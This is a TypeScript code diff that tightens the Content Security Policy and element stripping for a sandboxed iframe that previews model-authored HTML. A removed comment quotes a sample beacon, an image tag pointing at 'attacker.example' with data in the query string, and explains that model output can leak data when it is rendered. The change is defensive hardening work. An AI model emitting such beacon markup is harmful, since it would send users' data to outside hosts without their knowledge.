@@ -11,10 +11,19 @@
 export const REMOTE_IMAGE_PLACEHOLDER_CLASS = 'remote-image-placeholder';
 
 /**
- * CSP for HTML previews rendered in a sandboxed iframe: a model-authored
- * `<img src>` (or a CSS `background-image`) must not fetch a remote host.
+ * CSP for the static HTML preview: inline styles and local images only. Every
+ * other fetch (scripts, `fetch`, stylesheets, frames, fonts, media) is blocked.
  */
-export const PREVIEW_IMAGE_CSP = "img-src 'self' data: blob:";
+export const STATIC_PREVIEW_CSP =
+  "default-src 'none'; img-src 'self' data: blob:; style-src 'unsafe-inline'; " +
+  "font-src data:; media-src data: blob:; form-action 'none'; base-uri 'none'";
+
+/**
+ * Elements that reach a host in ways CSP does not cover (`<link rel=preconnect>`
+ * and `dns-prefetch`, `<meta http-equiv=refresh>`), or that could hide one from
+ * this pass (a `<template>` that becomes a declarative shadow root).
+ */
+const STATIC_PREVIEW_STRIPPED = 'link, meta, base, template';
 
 function pageUrl(): string {
   return typeof window !== 'undefined' ? window.location.href : 'http://localhost';
@@ -69,12 +78,33 @@ export function createRemoteImagePlaceholder(src: string): HTMLButtonElement {
   return button;
 }
 
+function stripPreviewElements(html: string): string {
+  const doc = new DOMParser().parseFromString(`<!doctype html>${html}`, 'text/html');
+  doc.querySelectorAll(STATIC_PREVIEW_STRIPPED).forEach((el) => el.remove());
+  return doc.documentElement.outerHTML;
+}
+
 /**
- * Wrap model-authored HTML for the preview iframe with a document-level CSP
- * that blocks remote image loads. The preview is model output too, so an
- * `<img src="https://attacker.example/?d=...">` inside an HTML fence would
- * otherwise beacon even though it is never clicked.
+ * `srcDoc` for the default HTML preview. The preview is model output too, so
+ * opening it must not send anything to a remote host. Render it in an iframe
+ * with an empty `sandbox` (no scripts, forms or popups): CSP cannot stop a
+ * script from navigating the frame to a remote URL.
  */
-export function htmlPreviewSrcDoc(html: string): string {
-  return `<!doctype html><meta http-equiv="Content-Security-Policy" content="${PREVIEW_IMAGE_CSP}">${html}`;
+export function staticHtmlPreviewSrcDoc(html: string): string {
+  // Serializing and reparsing can yield elements the first parse did not, so
+  // strip until the markup is stable; give up (empty preview) if it never is.
+  let body = stripPreviewElements(html);
+  for (let i = 0; i < 3; i++) {
+    const next = stripPreviewElements(body);
+    if (next === body) {
+      return (
+        '<!doctype html>' +
+        `<meta http-equiv="Content-Security-Policy" content="${STATIC_PREVIEW_CSP}">` +
+        '<meta http-equiv="x-dns-prefetch-control" content="off">' +
+        body
+      );
+    }
+    body = next;
+  }
+  return '';
 }
